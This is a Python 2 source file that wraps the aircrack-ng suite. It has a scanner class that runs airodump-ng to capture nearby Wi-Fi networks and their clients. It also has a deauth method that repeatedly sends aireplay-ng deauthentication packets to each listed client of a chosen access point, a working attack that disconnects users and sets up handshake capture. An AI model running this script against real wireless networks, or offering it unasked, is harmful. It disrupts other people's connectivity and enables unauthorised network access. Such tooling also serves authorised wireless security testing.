#!/usr/bin/python

import time
import os
import signal
from subprocess import Popen
from multiprocessing import Process, Pipe

class scanner(object):
#Dev null variable for subprocesses 
	DN = open(os.devnull, 'w')

	def __init__(self, iface):
		self.iface = iface

#scan looking for likely networks
#when suitable target networks detected stop scan
	def scan(self, out_format='', out_dest='', interval=10, channel=0, essid=0, bssid=0, conn=0):
		print "Creating command line for scanning process"
		self.cmd = ['airodump-ng']
		self.cmd.extend (['-a',			#only report attached clients
			'--output-format',			#output format
			out_format,				#xml type
			'--write-interval',			#write to file interval
			str(interval),				#10 seconds	
			'-w',						#write file dest
			out_dest+'scan'])						#file dest/name
		if channel != 0:
			self.cmd.append('-c')
			self.cmd.append(str(channel))
		if essid != 0:  
			self.cmd.append('--essid')
			self.cmd.append(str(essid))
		if bssid != 0:
			self.cmd.append('--bssid')
			self.cmd.append(str(bssid))
		self.cmd.append(self.iface)
		print "Starting process airodump-ng"
		print "Using command:", self.cmd 
		self.proc = Popen(self.cmd, stdout=self.DN, stderr=self.DN)
		while True:
			time.sleep(1)
			scanning = conn.recv() 
			#print "airodump child scanning:", scanning			#debug
			if scanning == False:
				print "Attempting to kill process scan"
				self.send_interrupt()	
				break				

	def deauth(self, essid='', bssid='', client_MAC=[], conn=0):
		self.client_MAC_list = client_MAC
		scanning = True
		while scanning == True:
			for MAC in self.client_MAC_list:
				if scanning == True:
					cmd = ['aireplay-ng']
					cmd.append('-b')		#bssid of AP
					cmd.append(bssid)
					cmd.append('-e')		#essid/name of AP
					cmd.append(essid)
					cmd.append('--deauth')	#number of deauth packets to send in one injection round
					cmd.append('6')
					cmd.append('-c')		#client target MAC address, better results than broadcast
					cmd.append(MAC)
					cmd.append(self.iface)
					#print "Using command:", cmd  		#debug
					self.proc = Popen(cmd)
				time.sleep(6)
				scanning = conn.recv()    
				if scanning == False:
					break
					
					

## Sends interrupt signal to process
	def send_interrupt(self):
		print "attempting to kill process:", self.proc.pid
		try:
			self.proc.terminate()
		except EnvironmentError:
			pass # ignore 
		except OSError:
			print "os error"
			pass  # process cannot be killed
		except TypeError:
			print "type error"
			pass  # pid is incorrect type
		except UnboundLocalError:
			print "unbound error"
			pass  # 'process' is not defined
		except AttributeError:
			print "attribute error"
			pass  # Trying to kill "None"
